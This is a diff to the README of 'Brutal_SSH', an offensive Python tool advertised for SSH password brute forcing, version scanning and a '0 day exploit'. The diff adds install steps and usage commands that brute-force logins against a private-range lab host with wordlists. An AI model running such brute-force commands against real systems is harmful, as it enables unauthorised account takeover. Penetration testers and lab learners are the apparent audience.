@@ -5,7 +5,13 @@
 
 **Brutal SSH -> SSH Login brute force, scan for vulnerable version and 0 day exploit**
 
-<img src="https://i.imgur.com/Qsc6IR8.png" />
+<img src="https://i.imgur.com/DoIksgM.png" />
+
+#### Output
+
+<img src="https://i.imgur.com/GcIBpFZ.png" />
+
+<img src="https://i.imgur.com/VF7C9bp.png" />
 
 ### Requirements
 
@@ -17,10 +23,26 @@
 - Python module `threading`
 - Python module `logging`
 
+### Install modules
+
+	pip install -r requirements.txt
+
+### Tested on
+
+- Kali linux
+
+### Download Brutal_SSH
+
+	git clone https://github.com/d3vilbug/Brutal_SSH
 
 
+### Usage
 
+	python brutal_SSH.py -h
 
+***Brute force password of single user***
+	python brutal_SSH.py -i 192.168.7.128 -u msfadmin -P wordlist/passfile.txt
 
-
+***Brute force user and password***
+	python brutal_SSH.py -i 192.168.7.128 -U wordlist/userfile.txt -P wordlist/passfile.txt
 
